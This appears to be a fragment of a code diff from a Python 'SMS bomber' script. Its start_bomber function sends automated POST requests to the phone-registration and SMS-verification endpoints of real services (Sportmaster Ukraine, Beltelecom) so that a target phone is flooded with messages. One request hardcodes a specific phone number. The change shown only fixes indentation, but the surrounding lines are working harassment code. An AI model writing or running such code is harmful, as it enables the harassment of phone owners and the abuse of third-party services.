@@ -441,7 +441,7 @@ def start_bomber():
 			requests.post('https://www.sportmaster.ua/?module=users&action=SendSMSReg&phone=+38%20(050)%20669-16-10', data={"result":"ok"})
 			print('[+] Sportmaster отправлено!')
 		except:
-			  print('[-] Sportmaster Не отправлено!')
+			print('[-] Sportmaster Не отправлено!')
 			
 		try:
 			requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
